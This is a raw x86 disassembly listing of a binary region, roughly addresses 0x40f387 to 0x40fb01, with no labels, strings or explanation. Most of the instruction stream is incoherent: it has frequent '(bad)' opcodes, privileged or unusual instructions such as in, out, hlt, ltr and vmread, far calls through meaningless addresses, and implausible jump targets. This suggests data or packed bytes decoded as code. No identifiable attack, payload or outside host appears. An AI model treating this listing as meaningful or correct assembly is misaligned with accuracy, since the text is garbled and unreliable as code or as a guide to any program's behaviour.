  40f387:	xor    eax,DWORD PTR [ebp-0xc401fd]
  40f38d:	jne    0x40f31a
  40f38f:	mov    eax,ds:0x33c70be0
  40f394:	ret    
  40f395:	out    dx,eax
  40f396:	mov    edx,DWORD PTR ds:0xbc0a31c
  40f39c:	push   eax
  40f39d:	xor    eax,DWORD PTR [ebp-0x71]
  40f3a0:	mov    esi,DWORD PTR [edx-0x68]
  40f3a3:	mov    ds:0x33ff0b00,eax
  40f3a8:	(bad)  
  40f3a9:	mov    ecx,0x8b8d0008
  40f3ae:	call   FWORD PTR [edi+edi*8]
  40f3b1:	and    bh,bh
  40f3b3:	push   0x66
  40f3b5:	mov    bp,0xff8d
  40f3b9:	(bad)  
  40f3ba:	(bad)  
  40f3bb:	dec    DWORD PTR [edi]
  40f3bd:	mov    DWORD PTR [edx],eax
  40f3bf:	jp     0x40f3c1
  40f3c1:	(bad)  
  40f3c2:	mov    ecx,0x774f59
  40f3c7:	mov    ecx,eax
  40f3c9:	jl     0x40f354
  40f3cb:	dec    DWORD PTR [eax-0x74c73fa7]
  40f3d1:	mov    DWORD PTR [esi+0x7e],esp
  40f3d4:	push   ebp
  40f3d5:	dec    DWORD PTR [ebp-0x7676f2a7]
  40f3db:	or     BYTE PTR [ebx+eiz*2+0x4d6666c2],0x55
  40f3e3:	xor    ecx,DWORD PTR [ebp-0x7627e877]
  40f3e9:	call   DWORD PTR [eax+0x668dc233]
  40f3ef:	test   al,0x55
  40f3f1:	mov    DWORD PTR [ebp-0x76bade7c],ecx
  40f3f7:	into   
  40f3f8:	xchg   esp,eax
  40f3f9:	loop   0x40f384
  40f3fb:	(bad)  
  40f3fc:	xchg   esi,eax
  40f3fd:	lods   al,BYTE PTR ds:[esi]
  40f3fe:	ret    0x8bd3
  40f401:	in     eax,dx
  40f402:	inc    bp
  40f404:	dec    ebp
  40f405:	in     al,0xb9
  40f407:	xor    BYTE PTR [edi-0x39],cl
  40f40a:	add    BYTE PTR [ecx+esi*8+0x64e189ec],dh
  40f411:	(bad)  
  40f412:	(bad)  
  40f413:	mov    eax,0x85667e8b
  40f418:	mov    ch,0xfe
  40f41a:	(bad)  
  40f41b:	(bad)  
  40f41c:	inc    DWORD PTR [eax]
  40f41e:	jno    0x40f420
  40f420:	data16 mov bl,0xb5
  40f423:	add    bh,bh
  40f425:	mov    edi,edi
  40f427:	fmul   QWORD PTR [ecx-0x729501]
  40f42d:	aam    0x8d
  40f42f:	call   edi
  40f431:	push   eax
  40f432:	mov    DWORD PTR [ebp+0x6c],eax
  40f435:	xor    edi,edi
  40f437:	add    eax,DWORD PTR [ebx-0x76bafcb0]
  40f43d:	sub    DWORD PTR [esi+0x44],0xffffffff
  40f441:	mov    ecx,DWORD PTR [ebp-0x767f1ee4]
  40f447:	add    DWORD PTR [eax+0x0],esi
  40f44a:	push   DWORD PTR [eax]
  40f44c:	push   bp
  40f44e:	lea    ecx,[ebp-0x8701]
  40f454:	mov    DWORD PTR [ecx+0x74],edx
  40f457:	sar    bh,1
  40f459:	or     DWORD PTR [ebx-0x48000386],0x77
  40f460:	fs test edi,edi
  40f463:	add    al,0x33
  40f465:	add    BYTE PTR [ebx],al
  40f467:	adc    dh,BYTE PTR [ebx]
  40f469:	add    BYTE PTR [esi-0x75],ah
  40f46c:	test   DWORD PTR [esi-0x1],esp
  40f46f:	inc    ebp
  40f470:	inc    DWORD PTR [ebx-0x2ff00abb]
  40f476:	dec    ebp
  40f477:	mov    DWORD PTR [ebx],esi
  40f479:	mov    al,BYTE PTR [ebx]
  40f47b:	push   ecx
  40f47c:	xor    esp,DWORD PTR [esi+0x66]
  40f47f:	push   ebp
  40f480:	inc    ebp
  40f481:	xor    DWORD PTR [ebx],0x8
  40f484:	mov    WORD PTR [ebp-0x72],ax
  40f488:	push   cx
  40f48a:	inc    ebp
  40f48b:	adc    WORD PTR [ebp-0x64],0xff83
  40f490:	mov    DWORD PTR [ebx],0x92b589f8
  40f496:	clc    
  40f497:	push   ecx
  40f498:	inc    ebp
  40f499:	data16 cmc 
  40f49b:	push   ebp
  40f49c:	pushf  
  40f49d:	data16 (bad) 
  40f49f:	dec    ebp
  40f4a0:	in     al,0x83
  40f4a2:	test   DWORD PTR [edi-0x76ba3508],eax
  40f4a8:	xor    ebx,DWORD PTR [eax+0xc7329c]
  40f4ae:	in     al,0x8b
  40f4b0:	add    eax,0x45b5f866
  40f4b5:	dec    DWORD PTR [ebx+0xf094ff]
  40f4bb:	mov    DWORD PTR [ecx+0x45fff466],ecx
  40f4c1:	lea    ecx,[ebx-0x4e76e3b3]
  40f4c7:	push   0x6600ff01
  40f4cc:	push   cs
  40f4cd:	test   DWORD PTR [eax+0xff01ff],eax
  40f4d3:	inc    ecx
  40f4d4:	inc    ebp
  40f4d5:	mov    WORD PTR [ebp-0x360018],ax
  40f4dc:	push   cs
  40f4dd:	shl    BYTE PTR [ebp+0x66],0x8b
  40f4e1:	test   DWORD PTR [edi+edi*8],ebx
  40f4e4:	cs (bad) 
  40f4e6:	inc    DWORD PTR [ecx-0x75]
  40f4e9:	data16 in al,dx
  40f4eb:	test   DWORD PTR [eax],ecx
  40f4ed:	inc    DWORD PTR [eax]
  40f4ef:	inc    DWORD PTR [ecx-0x77]
  40f4f2:	mov    esi,DWORD PTR [edx-0x77]
  40f4f5:	call   FWORD PTR [eax]
  40f4f7:	leavew 
  40f4f9:	xchg   ebp,eax
  40f4fa:	inc    edi
  40f4fb:	push   DWORD PTR [ebp-0x1]
  40f4fe:	call   0xff50e048
  40f503:	lea    eax,[ebp-0x1]
  40f506:	mov    edi,edi
  40f508:	enter  0xc7,0xc3
  40f50c:	mov    eax,ecx
  40f50e:	xor    ecx,DWORD PTR [ecx-0x749bfd]
  40f514:	sbb    al,0x8b
  40f516:	sbb    esp,edi
  40f518:	dec    ebp
  40f519:	mov    bh,0x8b
  40f51b:	mov    ah,cl
  40f51d:	mov    DWORD PTR [eax],0x8bc1ffc3
  40f523:	mov    eax,ebx
  40f525:	mov    BYTE PTR [eax],al
  40f527:	sar    bh,0x89
  40f52a:	sub    BYTE PTR [eax-0x77ff766c],cl
  40f530:	mov    esp,DWORD PTR [ebp+0x7c]
  40f533:	add    BYTE PTR [eax],al
  40f535:	inc    ebp
  40f536:	mov    esi,DWORD PTR ds:0xc7049c8d
  40f53c:	or     ah,bl
  40f53e:	add    BYTE PTR [ebp+0x458bf800],0x85
  40f545:	xor    DWORD PTR [edi],ecx
  40f547:	pushf  
  40f548:	js     0x40f511
  40f54a:	add    al,dh
  40f54c:	mov    eax,DWORD PTR [ebp+0x4509f8f4]
  40f552:	inc    eax
  40f553:	xor    eax,0x8b209f89
  40f558:	call   FWORD PTR [ebx+ecx*4]
  40f55b:	cmp    al,0x1
  40f55e:	mov    DWORD PTR [eax],0x8b8545c3
  40f564:	call   FWORD PTR [edi+edi*8]
  40f567:	dec    ebp
  40f568:	inc    ebp
  40f569:	mov    eax,DWORD PTR [ebx-0xffe374]
  40f56f:	mov    eax,DWORD PTR [eax]
  40f571:	mov    eax,edi
  40f573:	nop
  40f574:	ret    
  40f575:	add    BYTE PTR [ebp-0x130077],al
  40f57b:	jne    0x40f502
  40f57d:	test   edi,edi
  40f57f:	jne    0x40f580
  40f581:	dec    DWORD PTR [ebx-0x38aa1fe8]
  40f587:	call   0xffccf24f
  40f58c:	sbb    al,0x45
  40f58e:	stos   BYTE PTR es:[edi],al
  40f58f:	mov    eax,DWORD PTR [eax]
  40f591:	mov    edx,DWORD PTR [eax+0x3]
  40f594:	inc    ebp
  40f595:	cmp    al,0x8b
  40f597:	push   cs
  40f598:	cwde   
  40f599:	inc    ebp
  40f59a:	add    BYTE PTR [ebp-0xe78b39],al
  40f5a0:	call   FWORD PTR [esp+eax*1]
  40f5a3:	test   eax,0x8bffff00
  40f5a8:	mov    DWORD PTR [esp+eiz*4],ebx
  40f5ab:	adc    BYTE PTR [ebp+0x1],0x8b
  40f5af:	add    al,ch
  40f5b1:	add    al,dh
  40f5b3:	mov    DWORD PTR [ebp-0x3d],0x7589458b
  40f5ba:	mov    ecx,DWORD PTR [ebx-0x76cfe314]
  40f5c0:	inc    ebp
  40f5c1:	add    DWORD PTR [ebx-0x7aceb000],ecx
  40f5c7:	cmp    bh,0x1
  40f5ca:	inc    DWORD PTR [eax]
  40f5cc:	inc    ebp
  40f5cd:	push   eax
  40f5ce:	xor    ebp,ecx
  40f5d0:	add    eax,DWORD PTR [edx]
  40f5d2:	mov    DWORD PTR [eax],eax
  40f5d4:	and    al,0x80
  40f5d6:	inc    DWORD PTR [ecx]
  40f5d8:	lea    eax,[eax]
  40f5da:	pushf  
  40f5db:	or     BYTE PTR [ebp-0xfe00bb],al
  40f5e1:	jmp    0x13ff86b
  40f5e6:	dec    DWORD PTR [esi]
  40f5e8:	mov    ecx,ecx
  40f5ea:	loopne 0x40f571
  40f5ec:	mov    DWORD PTR [edx],0x4d8b00c3
  40f5f2:	sbb    al,0x8b
  40f5f4:	out    dx,al
  40f5f5:	mov    eax,DWORD PTR [eax]
  40f5f7:	push   eax
  40f5f8:	push   eax
  40f5f9:	test   DWORD PTR [ebp-0x1],eax
  40f5fc:	mov    edi,edi
  40f5fe:	cwde   
  40f5ff:	inc    ebp
  40f600:	add    BYTE PTR [ebx],dh
  40f602:	mov    DWORD PTR [ebx],0x24ff8918
  40f608:	add    al,0xff
  40f60a:	add    BYTE PTR [ebx-0x5ae30f77],cl
  40f610:	(bad)  
  40f611:	(bad)  
  40f612:	(bad)  
  40f613:	(bad)  
  40f614:	push   DWORD PTR [ebx]
  40f616:	or     BYTE PTR [ebx],al
  40f618:	ror    BYTE PTR [ecx-0xbad7d0],0x83
  40f61f:	(bad)  
  40f620:	cld    
  40f621:	sbb    BYTE PTR [ebx+0x765050ff],al
  40f627:	inc    ebp
  40f628:	mov    esi,DWORD PTR [ebx]
  40f62a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f62b:	add    ecx,esi
  40f62d:	push   eax
  40f62e:	mov    BYTE PTR [ebp+0x4d],0x5
  40f632:	jmp    0x40f634
  40f634:	mov    eax,DWORD PTR [eax]
  40f636:	clc    
  40f637:	mov    ecx,DWORD PTR [esp+ebx*1]
  40f63a:	inc    DWORD PTR [eax+0x5501fc]
  40f640:	mov    BYTE PTR [ebp-0xe70075],al
  40f646:	cmp    eax,DWORD PTR [eax]
  40f648:	push   eax
  40f649:	add    cl,ch
  40f64b:	xor    BYTE PTR [esi+0x4d],cl
  40f64e:	add    edi,edi
  40f650:	mov    ecx,DWORD PTR [eax]
  40f652:	mov    al,ds:0x8b8b004d
  40f657:	mov    ebp,DWORD PTR [ebx]
  40f659:	hlt    
  40f65a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f65b:	add    dh,al
  40f65d:	add    DWORD PTR [ebp+0x45],edx
  40f660:	mov    ecx,DWORD PTR [ecx+0x18d68b28]
  40f666:	dec    ebp
  40f667:	inc    eax
  40f668:	mov    DWORD PTR [ecx-0xbadf1c],ecx
  40f66e:	add    BYTE PTR [ebx-0x38162400],cl
  40f674:	add    bl,al
  40f676:	add    BYTE PTR [ebp-0x2e003e],al
  40f67c:	mov    DWORD PTR [ebp-0x10],eax
  40f67f:	mov    DWORD PTR [ebp+0x28],esp
  40f682:	push   eax
  40f683:	dec    DWORD PTR [ecx+0x5518e88d]
  40f689:	dec    DWORD PTR [ecx+0x5545f050]
  40f68f:	xor    ecx,DWORD PTR [edi]
  40f691:	add    edx,DWORD PTR [edx]
  40f693:	push   eax
  40f694:	xchg   ebp,eax
  40f695:	inc    ebp
  40f696:	inc    DWORD PTR ds:0xe200ff
  40f69c:	jnp    0x809612a2
  40f6a2:	mov    eax,DWORD PTR [ecx]
  40f6a4:	pusha  
  40f6a5:	add    bh,bh
  40f6a7:	test   ecx,eax
  40f6a9:	dec    DWORD PTR [edi+edi*8]
  40f6ac:	ret    0x8d00
  40f6af:	add    bh,bh
  40f6b1:	mov    ch,0xd7
  40f6b3:	(bad)  
  40f6b4:	cli    
  40f6b5:	inc    DWORD PTR [ebp+0x2255f830]
  40f6bb:	test   DWORD PTR [ebp+0x74],ecx
  40f6be:	add    ecx,DWORD PTR [ebx+0x65a01889]
  40f6c4:	or     BYTE PTR [eax],al
  40f6c6:	cmp    DWORD PTR [eax+0x74],edi
  40f6c9:	add    BYTE PTR [ebx+0x114dfc23],cl
  40f6cf:	sub    eax,DWORD PTR [eax]
  40f6d1:	mov    ecx,DWORD PTR [ebp-0x77]
  40f6d4:	mov    eax,edi
  40f6d6:	add    DWORD PTR [ebx],eax
  40f6d8:	inc    ebp
  40f6d9:	dec    ebp
  40f6da:	mov    ecx,DWORD PTR [edx+0x45450118]
  40f6e0:	add    cl,BYTE PTR [ebx+0x875fc4d]
  40f6e6:	mov    ecx,DWORD PTR [ebp-0xc]
  40f6e9:	inc    eax
  40f6ea:	push   ebp
  40f6eb:	push   ecx
  40f6ec:	mov    esi,DWORD PTR [edx-0x14]
  40f6ef:	mov    edx,DWORD PTR [ecx+0xce003c]
  40f6f5:	adc    DWORD PTR [eax+eax*1],0xd68b0045
  40f6fc:	add    al,0x55
  40f6fe:	push   ebp
  40f6ff:	add    ecx,DWORD PTR [ecx-0x2d030777]
  40f705:	push   ecx
  40f706:	test   DWORD PTR [ebx],eax
  40f708:	dec    DWORD PTR [ecx+0x554518ff]
  40f70e:	mov    edi,eax
  40f710:	sbb    al,0xec
  40f712:	inc    DWORD PTR [eax]
  40f714:	mov    DWORD PTR [eax],0xff8318
  40f71a:	add    al,0x83
  40f71c:	add    al,bh
  40f71e:	mov    ebp,edx
  40f720:	push   eax
  40f721:	push   ebp
  40f722:	test   DWORD PTR [edi+edi*8-0x73],esi
  40f726:	dec    DWORD PTR [eax]
  40f728:	inc    ebp
  40f729:	push   ebp
  40f72a:	xor    ecx,DWORD PTR [ebx+0x5589f003]
  40f730:	and    al,0x8b
  40f732:	(bad)  
  40f733:	call   0x89ddaec5
  40f738:	test   DWORD PTR [eax-0x1],esp
  40f73b:	(bad)  
  40f73c:	inc    DWORD PTR [ecx+0xffff85]
  40f742:	dec    DWORD PTR [ecx-0x6a1f5f75]
  40f748:	(bad)  
  40f749:	inc    ebx
  40f74b:	dec    DWORD PTR [ebx-0x117ee316]
  40f751:	arpl   WORD PTR [eax],ax
  40f753:	int    0x50
  40f755:	xor    eax,DWORD PTR [ebp-0x7f]
  40f758:	mov    esi,DWORD PTR [eax]
  40f75a:	cwde   
  40f75b:	pushf  
  40f75c:	add    BYTE PTR [ebp-0x1],dh
  40f75f:	mov    edi,edi
  40f761:	mov    al,ds:0x4d45ce08
  40f766:	inc    DWORD PTR [ebx]
  40f768:	adc    al,0x83
  40f76a:	add    BYTE PTR [eax],0x1
  40f76d:	adc    BYTE PTR [eax],al
  40f76f:	push   ebp
  40f770:	inc    ebp
  40f771:	add    edi,edi
  40f773:	mov    edx,DWORD PTR [eax]
  40f775:	mov    ecx,DWORD PTR [ebp-0x60]
  40f778:	push   esi
  40f779:	adc    al,0x8
  40f77b:	mov    edx,DWORD PTR [ebp-0x8]
  40f77e:	mov    ecx,DWORD PTR [ebp-0x4]
  40f781:	add    DWORD PTR [ebp-0x18],0xffffff8d
  40f785:	inc    DWORD PTR [eax+esi*8]
  40f788:	inc    ebp
  40f789:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f78a:	mov    edx,DWORD PTR [ebp+0x1c]
  40f78d:	add    DWORD PTR [ebp-0x14],eax
  40f790:	mov    edx,DWORD PTR [ebp-0x70]
  40f793:	cmp    eax,DWORD PTR [eax]
  40f795:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f796:	mov    eax,DWORD PTR [eax]
  40f798:	sbb    al,0x73
  40f79a:	add    BYTE PTR [ebx],0x1
  40f79d:	hlt    
  40f79e:	add    BYTE PTR [eax+0x30],dl
  40f7a1:	mov    DWORD PTR [ecx],esi
  40f7a3:	hlt    
  40f7a4:	pop    ds
  40f7a5:	inc    ebp
  40f7a6:	xor    al,BYTE PTR [ebp+0x6c760f3a]
  40f7ac:	(bad)  
  40f7ad:	push   DWORD PTR [edi]
  40f7af:	mov    ecx,DWORD PTR [ebx+0x398503a4]
  40f7b5:	push   DWORD PTR [ebx-0x1]
  40f7b8:	mov    eax,DWORD PTR [ebp-0x740075]
  40f7be:	sub    eax,DWORD PTR [eax]
  40f7c0:	add    eax,DWORD PTR [eax]
  40f7c2:	mov    DWORD PTR [ecx+0x5f],eax
  40f7c5:	mov    DWORD PTR [ebx+0x20],ebx
  40f7c8:	ret    0xff
  40f7cb:	mov    ecx,DWORD PTR [ebx+0x1cc783dc]
  40f7d1:	ret    
  40f7d2:	mov    eax,DWORD PTR [ebp-0x6f0075]
  40f7d8:	add    BYTE PTR [ebp-0x7d],al
  40f7db:	mov    DWORD PTR [eax],eax
  40f7dd:	sub    BYTE PTR [edi+edi*8+0x18008d01],al
  40f7e4:	sar    bh,cl
  40f7e6:	test   BYTE PTR [eax+0x1],dl
  40f7e9:	inc    ebp
  40f7ea:	add    BYTE PTR [ebx],dh
  40f7ec:	test   BYTE PTR [ebx],0x84
  40f7ef:	push   eax
  40f7f0:	add    BYTE PTR [ebp+0x0],al
  40f7f3:	add    eax,0x86
  40f7f8:	add    BYTE PTR [ebx-0x7f7be340],cl
  40f7fe:	add    BYTE PTR [ecx],al
  40f800:	add    BYTE PTR [eax],al
  40f802:	mov    esi,0x550030
  40f807:	mov    ecx,DWORD PTR [edi]
  40f809:	sbb    al,0xda
  40f80b:	jne    0x40f80d
  40f80d:	mov    edi,DWORD PTR [ecx]
  40f80f:	xor    BYTE PTR [eax+eax*1],0x84
  40f813:	add    eax,DWORD PTR [eax]
  40f815:	cld    
  40f816:	add    BYTE PTR [ebp-0x4f],dh
  40f819:	mov    eax,DWORD PTR [ecx]
  40f81b:	cld    
  40f81c:	add    BYTE PTR [ecx-0x1bff009b],cl
  40f822:	retf   0xe45
  40f825:	add    eax,edx
  40f827:	sbb    al,0xb7
  40f829:	dec    ebp
  40f82a:	or     al,0x89
  40f82c:	dec    ebp
  40f82d:	sbb    al,0xf
  40f82f:	inc    ebp
  40f830:	dec    eax
  40f831:	mov    eax,DWORD PTR [ebx]
  40f833:	sbb    al,0xf
  40f835:	nop
  40f836:	scas   al,BYTE PTR es:[edi]
  40f837:	add    DWORD PTR [eax],eax
  40f839:	add    BYTE PTR [ebp-0x7674ebbb],cl
  40f83f:	mov    eax,gs
  40f841:	add    bh,bh
  40f843:	mov    edi,edi
  40f845:	cmp    DWORD PTR [edi+0x72],edx
  40f848:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  40f84e:	gs cmp al,0x0
  40f851:	je     0x40f829
  40f853:	push   eax
  40f854:	sar    BYTE PTR [eax],1
  40f856:	mov    bh,0x3e
  40f858:	push   cs
  40f859:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  40f85f:	add    DWORD PTR [ecx+0x12],ebp
  40f862:	dec    edx
  40f863:	(bad)  
  40f864:	mov    eax,edx
  40f866:	in     al,dx
  40f867:	adc    DWORD PTR [ecx],esi
  40f869:	pop    esi
  40f86a:	inc    ecx
  40f86b:	leave  
  40f86c:	or     DWORD PTR [eax],ebx
  40f86e:	gs push ebp
  40f870:	add    ah,ch
  40f872:	into   
  40f873:	in     al,dx
  40f874:	enter  0xb756,0xf0
  40f878:	push   cs
  40f879:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  40f883:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  40f889:	jnp    0x74417d91
  40f88f:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  40f895:	add    BYTE PTR [edi],cl
  40f897:	mov    edi,DWORD PTR [ecx-0x78]
  40f89a:	ltr    WORD PTR [ecx-0x7b]
  40f89e:	dec    DWORD PTR [edi]
  40f8a0:	clc    
  40f8a1:	out    0x45,eax
  40f8a3:	add    BYTE PTR [eax],cl
  40f8a5:	cmp    ebx,0xffffff8c
  40f8a8:	jge    0x40f8aa
  40f8aa:	jb     0x40f8bc
  40f8ac:	je     0x4ff92c
  40f8b2:	pop    edx
  40f8b3:	push   esi
  40f8b4:	mov    ecx,DWORD PTR [edi]
  40f8b6:	in     al,dx
  40f8b7:	rol    DWORD PTR [ebp+0x0],1
  40f8ba:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  40f8c1:	cmp    DWORD PTR [ecx],0xfffffff0
  40f8c4:	hlt    
  40f8c5:	mov    esp,DWORD PTR [eax+0xf034d2b]
  40f8cb:	(bad)  
  40f8cd:	push   eax
  40f8ce:	jns    0xb840dd4c
  40f8d4:	lock push cs
  40f8d6:	ror    edx,0x3
  40f8d9:	test   BYTE PTR [ecx+0x5500e800],cl
  40f8df:	dec    eax
  40f8e0:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  40f8e4:	(bad)  
  40f8e5:	mov    esi,0x7f33ff5f
  40f8ea:	inc    eax
  40f8eb:	test   DWORD PTR [edx],eax
  40f8ed:	je     0x40f8af
  40f8ef:	mov    ecx,ecx
  40f8f1:	adc    DWORD PTR [ebp-0xc],0xffffffec
  40f8f5:	and    eax,DWORD PTR [eax+0xf0103]
  40f8fb:	jp     0x40f8e9
  40f8fd:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  40f901:	add    edx,DWORD PTR [edi+0x74]
  40f904:	sbb    BYTE PTR [ebp+0x4d001484],cl
  40f90a:	add    BYTE PTR [ebp-0x74c48bbb],al
  40f910:	je     0x40f895
  40f912:	cmp    eax,edi
  40f914:	js     0x40f939
  40f916:	add    eax,0xeb0fc003
  40f91b:	jns    0x40f8a8
  40f91d:	vmread DWORD PTR [ecx+0x45],ebx
  40f921:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  40f927:	adc    al,0x8b
  40f929:	jge    0x40f93f
  40f92b:	mov    edi,DWORD PTR [eax-0x4]
  40f92e:	add    edi,DWORD PTR [edi]
  40f930:	or     bh,bh
  40f932:	push   ebp
  40f933:	push   es
  40f934:	mov    DWORD PTR [ebp-0x4],ebx
  40f937:	add    edi,esi
  40f939:	pop    es
  40f93a:	add    esi,DWORD PTR [edi-0x48ccf183]
  40f940:	mov    DWORD PTR [esp+esi*8],ecx
  40f943:	inc    ebp
  40f944:	pop    ebp
  40f945:	xor    DWORD PTR [esi-0x4],0x3b
  40f949:	add    edx,DWORD PTR [ecx+edi*1]
  40f94c:	push   es
  40f94d:	clc    
  40f94e:	mov    bh,0xdb
  40f950:	jp     0x40f909
  40f952:	add    cl,BYTE PTR [esi]
  40f954:	div    DWORD PTR [edi+0x4d8b0c1c]
  40f95a:	test   edi,edi
  40f95c:	je     0x40f952
  40f95e:	mov    eax,ecx
  40f960:	or     BYTE PTR [ebx],al
  40f962:	dec    BYTE PTR [ecx+0x7d3bec7d]
  40f968:	jbe    0x40f9dc
  40f96a:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  40f970:	add    ecx,DWORD PTR [esi]
  40f972:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  40f978:	add    eax,DWORD PTR [ebx-0x287af783]
  40f97e:	je     0x40f9cd
  40f980:	mov    DWORD PTR [ecx],edi
  40f982:	mov    esi,eax
  40f984:	hlt    
  40f985:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  40f98c:	jb     0x40f94e
  40f98e:	jmp    0x40f97b
  40f990:	xor    esi,DWORD PTR [ebx]
  40f992:	pop    edi
  40f993:	pop    esi
  40f994:	pop    ebx
  40f995:	ret    
  40f996:	ret    0x8b
  40f999:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  40f99f:	xor    DWORD PTR ds:0x89339c0c,0x56
  40f9a6:	cld    
  40f9a7:	cmp    DWORD PTR [ebp+0xf],eax
  40f9aa:	xor    al,BYTE PTR [ebp-0x7474ff64]
  40f9b0:	cld    
  40f9b1:	or     al,0x4d
  40f9b3:	ret    
  40f9b4:	mov    edi,DWORD PTR [esi-0x4]
  40f9b7:	pop    eax
  40f9b8:	dec    ebp
  40f9b9:	jne    0x40f946
  40f9bb:	xor    edi,esp
  40f9bd:	inc    eax
  40f9be:	dec    ebp
  40f9bf:	jbe    0x40fa14
  40f9c1:	inc    eax
  40f9c2:	pop    ebp
  40f9c3:	add    edx,DWORD PTR [esi+0x8]
  40f9c6:	push   esi
  40f9c7:	dec    eax
  40f9c8:	push   ecx
  40f9c9:	mov    eax,edi
  40f9cb:	and    al,0xf0
  40f9cd:	jo     0x40f9ba
  40f9cf:	mov    eax,DWORD PTR [ebx]
  40f9d1:	sbb    BYTE PTR [ebp+0x4d],cl
  40f9d4:	mov    eax,DWORD PTR [ebx]
  40f9d6:	nop
  40f9d7:	or     BYTE PTR [eax],al
  40f9d9:	jne    0x40fa32
  40f9db:	cmp    ebx,DWORD PTR [ebp+0x33893277]
  40f9e1:	cld    
  40f9e2:	xor    edi,edi
  40f9e4:	add    edi,DWORD PTR [ebp+0x3]
  40f9e7:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  40f9ed:	js     0x40f973
  40f9ef:	jae    0x40f9f3
  40f9f1:	(bad)  
  40f9f3:	xor    al,0x5d
  40f9f5:	jmp    0x40f982
  40f9f7:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  40f9fe:	fdecstp 
  40fa00:	test   BYTE PTR [edi],ah
  40fa02:	add    bh,BYTE PTR [ebp+0x0]
  40fa05:	add    ebx,DWORD PTR [ebp-0x77]
  40fa08:	mov    edi,eax
  40fa0a:	cmp    al,0x0
  40fa0d:	adc    dh,BYTE PTR [ebx]
  40fa0f:	jge    0x40fa14
  40fa11:	mov    edi,DWORD PTR [ebx]
  40fa13:	jl     0x40fa24
  40fa15:	clc    
  40fa16:	dec    edi
  40fa17:	jge    0x40fa19
  40fa19:	mov    eax,DWORD PTR [ebx]
  40fa1b:	jb     0x40fa25
  40fa1d:	mov    ecx,DWORD PTR [ebp-0x8]
  40fa20:	mov    edi,edi
  40fa22:	xor    edx,DWORD PTR [eax]
  40fa24:	add    edi,DWORD PTR [ebx]
  40fa26:	mov    DWORD PTR [ebp-0x10],edi
  40fa29:	inc    edi
  40fa2a:	pop    ebp
  40fa2b:	jge    0x40fa68
  40fa2d:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  40fa31:	mov    edx,0xc05d87f0
  40fa36:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  40fa3a:	fimul  WORD PTR [eax]
  40fa3c:	fist   WORD PTR [ebp+0x1c]
  40fa3f:	in     al,dx
  40fa40:	jne    0x40fa2e
  40fa42:	mov    edi,DWORD PTR [edx-0x7a27a10]
  40fa48:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  40fa4c:	fdivp  st(0),st
  40fa4e:	fild   WORD PTR [ebp+0x4510f85c]
  40fa54:	test   BYTE PTR [ebx+0x4d00fc02],cl
  40fa5a:	inc    ebp
  40fa5b:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  40fa61:	mov    ebp,DWORD PTR [ebx-0x4]
  40fa64:	adc    al,0x8b
  40fa66:	rcl    DWORD PTR [eax],0x48
  40fa69:	mov    esi,0x7080803
  40fa6e:	fiadd  WORD PTR [ebp+0x4d]
  40fa71:	(bad)  
  40fa72:	mov    edx,DWORD PTR [edx-0x4]
  40fa75:	mov    edx,DWORD PTR [ebp-0x4]
  40fa78:	xor    ebx,DWORD PTR [ebx+0x330103]
  40fa7e:	mov    DWORD PTR [edi+0x872dc],edi
  40fa84:	xlat   BYTE PTR ds:[ebx]
  40fa85:	into   
  40fa86:	ffreep st(6)
  40fa88:	retf   0x6c7
  40fa8b:	iret   
  40fa8c:	dec    ebp
  40fa8d:	inc    ebp
  40fa8e:	mov    DWORD PTR [ebx],edi
  40fa90:	fmul   QWORD PTR [edi]
  40fa92:	dec    ebp
  40fa93:	jnp    0x40fac8
  40fa95:	add    BYTE PTR [ebx],al
  40fa97:	mov    ecx,DWORD PTR [esp+edi*8]
  40fa9a:	inc    ebp
  40fa9b:	dec    ebp
  40fa9c:	lea    esi,[ebx]
  40fa9e:	add    DWORD PTR [ebx],eax
  40faa0:	jb     0x40fadd
  40faa2:	add    BYTE PTR [edi],cl
  40faa4:	inc    ebp
  40faa5:	imul   eax,edi,0x858bd800
  40faab:	cld    
  40faac:	clc    
  40faad:	mov    DWORD PTR [ebp+0x0],eax
  40fab0:	inc    DWORD PTR [eax]
  40fab2:	or     al,0xde
  40fab4:	sbb    bh,0x1
  40fab7:	retf   
  40fab8:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  40fabf:	dec    ebp
  40fac0:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  40fac6:	enter  0x12de,0xdf
  40faca:	inc    ebp
  40facb:	pop    ebp
  40facc:	dec    DWORD PTR [ebx-0x257f0ff4]
  40fad2:	add    DWORD PTR [edx],edx
  40fad4:	add    BYTE PTR [ebp+0x50],dl
  40fad7:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  40fadd:	xor    ecx,DWORD PTR [edx-0x38c699fd]
  40fae3:	or     ah,al
  40fae5:	pop    ss
  40fae6:	cdq    
  40fae7:	push   ebp
  40fae8:	clc    
  40fae9:	mov    eax,DWORD PTR [ebp-0x4]
  40faec:	xor    edx,edx
  40faee:	add    esi,DWORD PTR [ebx]
  40faf0:	cmp    eax,DWORD PTR [ebx]
  40faf2:	hlt    
  40faf3:	cmp    DWORD PTR [ebx],esp
  40faf5:	or     al,BYTE PTR [ebp+0xf]
  40faf8:	mov    eax,DWORD PTR [edx]
  40fafa:	loopne 0x40fafc
  40fafc:	(bad)  
  40fafd:	mov    ecx,esi
  40faff:	cld    
  40fb00:	pushf  
  40fb01:	pop    ebp
